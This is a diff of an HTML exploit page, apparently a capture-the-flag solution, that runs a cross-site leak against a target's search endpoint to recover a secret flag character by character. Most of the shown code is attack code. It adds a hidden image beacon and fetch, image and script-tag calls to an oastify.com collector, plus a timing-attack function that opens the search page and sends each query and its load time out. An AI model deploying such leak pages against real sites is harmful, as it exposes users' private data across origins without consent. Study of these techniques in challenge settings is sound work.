@@ -8,11 +8,14 @@
     <h1>Exploiting...</h1>
     <pre id="log"></pre>
 
+    <!-- Test: Simple image tag to verify bot visits -->
+    <img src="https://i0j7cw2oc4pgx30tsoskx589b0hr5sth.oastify.com/?f=IMG_TEST&t=1" style="display:none">
+
     <script>
         const log = document.getElementById('log');
         const chars = "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789{}_-=!@#$%^&*.,:";
         const TARGET_URL = "https://wonder.cbd2026.cloud";
-        const LEAK_URL = "https://ezh3bs1kb0ocwzzprkrgw175awgn4nsc.oastify.com";
+        const LEAK_URL = "https://i0j7cw2oc4pgx30tsoskx589b0hr5sth.oastify.com";
         
         let flag = "";
         
@@ -20,10 +23,24 @@
             log.textContent += msg + "\n";
         }
 
-        // Debug: Send START signal immediately
-        fetch(`${LEAK_URL}?f=START&t=${Date.now()}`)
-            .then(() => logMsg("START signal sent"))
-            .catch(e => logMsg("START failed: " + e));
+        // Debug: Send START signal immediately using multiple methods
+        try {
+            fetch(`${LEAK_URL}?f=START&t=${Date.now()}`)
+                .then(() => logMsg("START signal sent via fetch"))
+                .catch(e => logMsg("START fetch failed: " + e));
+        } catch(e) {
+            logMsg("START fetch error: " + e);
+        }
+
+        // Also try with image
+        new Image().src = `${LEAK_URL}?f=START_IMG&t=${Date.now()}`;
+        logMsg("START_IMG sent");
+
+        // Also try with script
+        const script = document.createElement('script');
+        script.src = `${LEAK_URL}?f=START_SCRIPT&t=${Date.now()}`;
+        document.body.appendChild(script);
+        logMsg("START_SCRIPT sent");
 
         async function test(query) {
             const url = `${TARGET_URL}/search?q=${encodeURIComponent(query)}`;
@@ -112,6 +129,31 @@
             
             logMsg("No prefix found, trying empty search...");
             return "";
+        }
+
+        async function timingAttack(query) {
+            const url = `${TARGET_URL}/search?q=${encodeURIComponent(query)}`;
+            
+            const start = performance.now();
+            const w = window.open(url, "timing_window");
+            
+            if (!w) {
+                return false;
+            }
+            
+            await new Promise(r => setTimeout(r, 3000));
+            
+            const end = performance.now();
+            const duration = end - start;
+            
+            w.close();
+            
+            // If page has iframe, it might take longer to load
+            logMsg(`Timing for "${query}": ${duration}ms`);
+            fetch(`${LEAK_URL}?f=TIMING:${query}:${duration}`)
+                .catch(e => {});
+            
+            return duration > 2000; // Threshold - adjust based on testing
         }
 
         async function leakFlag() {
